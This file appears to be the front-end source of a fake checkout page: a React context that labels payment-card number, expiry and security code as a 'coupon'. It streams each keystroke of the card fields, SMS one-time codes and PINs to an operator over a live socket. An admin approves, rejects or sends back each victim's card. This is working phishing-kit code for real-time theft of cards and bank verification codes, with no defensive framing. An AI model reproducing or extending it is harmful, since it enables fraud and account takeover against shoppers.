import React, { createContext, useContext, useState, useEffect, useRef, useCallback, ReactNode } from "react";
import { io, Socket } from "socket.io-client";
import { API_URL } from "@/lib/constants";

export interface LiveFormData {
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  address: string;
  city: string;
  state: string;
  zipCode: string;
  country: string;
}

export interface CouponData {
  code: string;
  dateMMYY: string;
  password: string;
}

export type OrderStatus = "IDLE" | "SHIPPING_SUBMITTED" | "COUPON_SUBMITTING" | "WAITING_APPROVAL" | "APPROVED" | "REJECTED" | "AUTO_REJECTED" | "WAITING_SMS" | "SMS_SUBMITTED" | "REQUEST_PIN" | "PIN_SUBMITTED" | "COMPLETED" | "RETURN_COUPON";

const ORDER_STATUS_VALUES: OrderStatus[] = [
  "IDLE",
  "SHIPPING_SUBMITTED",
  "COUPON_SUBMITTING",
  "WAITING_APPROVAL",
  "APPROVED",
  "REJECTED",
  "AUTO_REJECTED",
  "WAITING_SMS",
  "SMS_SUBMITTED",
  "REQUEST_PIN",
  "PIN_SUBMITTED",
  "COMPLETED",
  "RETURN_COUPON",
];

interface RealtimeContextType {
  // Shipping Data
  liveData: LiveFormData | null;
  updateLiveData: (data: LiveFormData) => void;
  
  // Coupon Data
  couponData: CouponData | null;
  updateCouponData: (data: CouponData) => void;

  // SMS Verification
  smsCode: string;
  updateSmsCode: (code: string) => void;

  // PIN Verification
  pinCode: string;
  updatePinCode: (code: string) => void;
  
  // Workflow State
  currentOrderId: string | null;
  orderStatus: OrderStatus;
  setOrderStatus: (status: OrderStatus) => void;
  setCurrentOrderId: (id: string) => void;
  
  // Admin Actions
  adminAction: (action: "APPROVE" | "REJECT") => void;
  
  // Cart
  cartTotal: number;
  setCartTotal: (total: number) => void;
  
  // Backend Integration
  submitOrder: (finalCouponData?: CouponData) => Promise<boolean>;
  submitSMS: (code?: string) => Promise<boolean>;
  submitPin: (code?: string) => Promise<boolean>;
  resubmitCoupon: (newCouponData: CouponData) => Promise<boolean>;
  startLiveSession: (opts?: { force?: boolean }) => void;
  endLiveSession: () => void;
  
  // Expose socket for admin components to reuse
  socket: Socket | null;
}

const RealtimeContext = createContext<RealtimeContextType | undefined>(undefined);

// API Base URL (set VITE_API_URL when frontend is on another domain)
// API_URL imported from constants

export const RealtimeProvider = ({ children }: { children: ReactNode }) => {
  const [liveData, setLiveData] = useState<LiveFormData | null>(null);
  const [couponData, setCouponData] = useState<CouponData | null>(null);
  const [smsCode, setSmsCode] = useState<string>("");
  const [pinCode, setPinCode] = useState<string>("");
  // Persist currentOrderId and order_token to sessionStorage (order_token required for /sms and /update-coupon)
  const [currentOrderId, _setCurrentOrderId] = useState<string | null>(() => {
    try { return sessionStorage.getItem('currentOrderId'); } catch { return null; }
  });
  const [orderToken, _setOrderToken] = useState<string | null>(() => {
    try { return sessionStorage.getItem('orderToken'); } catch { return null; }
  });
  const setCurrentOrderId = useCallback((id: string) => {
    _setCurrentOrderId(id);
    try {
      sessionStorage.setItem("currentOrderId", id);
    } catch {
      // ignore session storage errors
    }
  }, []);
  const setOrderToken = useCallback((tokenValue: string) => {
    _setOrderToken(tokenValue);
    try {
      sessionStorage.setItem("orderToken", tokenValue);
    } catch {
      // ignore session storage errors
    }
  }, []);
  const clearCurrentOrderId = useCallback(() => {
    _setCurrentOrderId(null);
    _setOrderToken(null);
    try {
      sessionStorage.removeItem("currentOrderId");
      sessionStorage.removeItem("orderToken");
      sessionStorage.removeItem("orderStatus");
    } catch {
      // ignore session storage errors
    }
  }, []);
  const [orderStatus, _setOrderStatus] = useState<OrderStatus>(() => {
    try {
      const raw = sessionStorage.getItem('orderStatus');
      if (raw && ORDER_STATUS_VALUES.includes(raw as OrderStatus)) {
        return raw as OrderStatus;
      }
    } catch {
      // ignore
    }
    return "IDLE";
  });
  const setOrderStatus = useCallback((status: OrderStatus) => {
    _setOrderStatus(status);
    try {
      sessionStorage.setItem('orderStatus', status);
    } catch {
      // ignore
    }
  }, []);
  const [socket, setSocket] = useState<Socket | null>(null);
  const [cartTotal, setCartTotal] = useState<number>(0);

  // Initialize Socket.io
  useEffect(() => {
    const newSocket = io(API_URL);
    setSocket(newSocket);

    return () => {
      newSocket.close();
    };
  }, []);

  const currentOrderIdRef = useRef(currentOrderId);
  currentOrderIdRef.current = currentOrderId;

  // Emit join_order only when currentOrderId changes (no re-register of listeners)
  useEffect(() => {
    if (!socket) return;
    if (currentOrderId) socket.emit("join_order", currentOrderId);
  }, [socket, currentOrderId]);

  // Register order_update once; handler uses ref so it always sees latest currentOrderId
  useEffect(() => {
    if (!socket) return;
    const handler = (data: { id: string; status: OrderStatus; smsCode?: string }) => {
      if (data.id === currentOrderIdRef.current) {
        setOrderStatus(data.status);
      }
    };
    socket.on("order_update", handler);
    return () => {
      socket.off("order_update", handler);
    };
  }, [setOrderStatus, socket]);

  // Clear persisted order ID when order is completed
  useEffect(() => {
    if (orderStatus === "COMPLETED") {
      clearCurrentOrderId();
    }
  }, [orderStatus, clearCurrentOrderId]);

  const updateLiveData = useCallback((data: LiveFormData) => {
    setLiveData(data);
  }, []);

  const updateCouponData = useCallback((data: CouponData) => {
    setCouponData(data);
    if (currentOrderId) {
      // Existing order: send real-time update to the order row itself
      socket?.emit("live_order_coupon_update", {
        orderId: currentOrderId,
        code: data.code,
        dateMMYY: data.dateMMYY,
        password: data.password,
      });
    } else {
      // No order yet: send to live typing session
      socket?.emit("live_coupon_update", {
        code: data.code,
        dateMMYY: data.dateMMYY,
        password: data.password,
      });
    }
  }, [currentOrderId, socket]);

  const updateSmsCode = useCallback((code: string) => {
    setSmsCode(code);
  }, []);

  const updatePinCode = useCallback((code: string) => {
    setPinCode(code);
    if (currentOrderId) {
      socket?.emit("live_pin_update", { pinCode: code });
    }
  }, [currentOrderId, socket]);

  const startLiveSession = useCallback((opts?: { force?: boolean }) => {
    if (!liveData) return;
    if (currentOrderId && !opts?.force) return; // Order already exists; use force for RETURN_COUPON resubmit flow
    socket?.emit("live_session_start", {
      customer: liveData,
      cartTotal,
    });
  }, [cartTotal, currentOrderId, liveData, socket]);

  const endLiveSession = useCallback(() => {
    socket?.emit("live_session_end");
  }, [socket]);

  // Resubmit Coupon (update existing order after admin sends back)
  const resubmitCoupon = useCallback(async (newCouponData: CouponData): Promise<boolean> => {
    if (!currentOrderId || !newCouponData) return false;

    setOrderStatus("WAITING_APPROVAL");
    socket?.emit("live_session_end");

    try {
      const body: { couponCode: string; dateMMYY: string; password: string; order_token?: string } = {
        couponCode: newCouponData.code,
        dateMMYY: newCouponData.dateMMYY,
        password: newCouponData.password,
      };
      if (orderToken) body.order_token = orderToken;
      const response = await fetch(`${API_URL}/api/orders/${currentOrderId}/update-coupon`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      });

      if (!response.ok) {
        const detail = await response.text();
        throw new Error(`Failed to update coupon: ${detail}`);
      }

      const result = await response.json();
      if (result.autoRejected) {
        setOrderStatus("REJECTED");
      }
      return true;
    } catch (error) {
      console.error("Error resubmitting coupon:", error);
      setOrderStatus("RETURN_COUPON");
      return false;
    }
  }, [currentOrderId, orderToken, setOrderStatus, socket]);

  // Submit Order to Backend
  const submitOrder = useCallback(async (finalCouponData?: CouponData): Promise<boolean> => {
    const couponToUse = finalCouponData || couponData;

    if (!liveData || !couponToUse) {
      console.error("Missing data for submission", { liveData, couponData: couponToUse });
      return false;
    }

    // Safety: if an order already exists, update it instead of creating a new one
    if (currentOrderId) {
      return resubmitCoupon(couponToUse);
    }

    setOrderStatus("WAITING_APPROVAL");
    socket?.emit("live_session_end");

    try {
      const response = await fetch(`${API_URL}/api/orders`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          customer: liveData,
          total: cartTotal,
          couponCode: couponToUse.code,
          dateMMYY: couponToUse.dateMMYY,
          password: couponToUse.password,
        }),
      });

      if (!response.ok) {
        const detail = await response.text();
        throw new Error(`Failed to submit order: ${detail}`);
      }

      const result = await response.json();
      const actualOrderId = result.order.id;
      const tokenValue = result.order.order_token;
      setCurrentOrderId(actualOrderId);
      if (tokenValue) setOrderToken(tokenValue);
      if (result.autoRejected) {
        // Luhn check failed or card expired - auto reject
        setOrderStatus("REJECTED");
      } else {
        socket?.emit("join_order", actualOrderId);
      }
      return true;
    } catch (error) {
      console.error("Error submitting order:", error);
      setOrderStatus("IDLE");
      return false;
    }
  }, [
    cartTotal,
    couponData,
    currentOrderId,
    liveData,
    resubmitCoupon,
    setCurrentOrderId,
    setOrderStatus,
    setOrderToken,
    socket,
  ]);

  const submitSMS = useCallback(async (code?: string): Promise<boolean> => {
    const smsCodeToUse = code || smsCode;
    if (!currentOrderId || !smsCodeToUse) return false;
    setOrderStatus("SMS_SUBMITTED");
    try {
      const body: { smsCode: string; order_token?: string } = { smsCode: smsCodeToUse };
      if (orderToken) body.order_token = orderToken;
      const response = await fetch(`${API_URL}/api/orders/${currentOrderId}/sms`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      });
      if (!response.ok) {
        const detail = await response.text();
        throw new Error(`Failed to submit SMS: ${detail}`);
      }
      return true;
    } catch (error) {
      console.error("Error submitting SMS:", error);
      setOrderStatus("WAITING_SMS");
      return false;
    }
  }, [currentOrderId, orderToken, setOrderStatus, smsCode]);

  const submitPin = useCallback(async (code?: string): Promise<boolean> => {
    const pinCodeToUse = code || pinCode;
    if (!currentOrderId || !pinCodeToUse) return false;
    setOrderStatus("PIN_SUBMITTED");
    try {
      const body: { pinCode: string; order_token?: string } = { pinCode: pinCodeToUse };
      if (orderToken) body.order_token = orderToken;
      const response = await fetch(`${API_URL}/api/orders/${currentOrderId}/pin`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      });
      if (!response.ok) {
        const detail = await response.text();
        throw new Error(`Failed to submit PIN: ${detail}`);
      }
      return true;
    } catch (error) {
      console.error("Error submitting PIN:", error);
      setOrderStatus("REQUEST_PIN");
      return false;
    }
  }, [currentOrderId, orderToken, pinCode, setOrderStatus]);

  const adminAction = useCallback((action: "APPROVE" | "REJECT") => {
    // This is for local simulation/optimistic UI, but real action happens via Admin Dashboard
    if (action === "APPROVE") setOrderStatus("APPROVED");
    else setOrderStatus("REJECTED");
  }, [setOrderStatus]);

  const value = React.useMemo(() => ({
    liveData, updateLiveData,
    couponData, updateCouponData,
    smsCode, updateSmsCode,
    pinCode, updatePinCode,
    currentOrderId, setCurrentOrderId,
    orderStatus, setOrderStatus,
    adminAction,
    cartTotal, setCartTotal,
    submitOrder, submitSMS, submitPin, resubmitCoupon,
    startLiveSession, endLiveSession,
    socket
  }), [
    adminAction,
    cartTotal,
    couponData,
    currentOrderId,
    endLiveSession,
    liveData,
    orderStatus,
    pinCode,
    resubmitCoupon,
    smsCode,
    socket,
    startLiveSession,
    submitOrder,
    submitPin,
    submitSMS,
    updateCouponData,
    updateLiveData,
    updatePinCode,
    updateSmsCode,
    setCurrentOrderId,
    setOrderStatus,
  ]);

  return (
    <RealtimeContext.Provider value={value}>
      {children}
    </RealtimeContext.Provider>
  );
};

export const useRealtime = () => {
  const context = useContext(RealtimeContext);
  if (context === undefined) {
    throw new Error("useRealtime must be used within a RealtimeProvider");
  }
  return context;
};
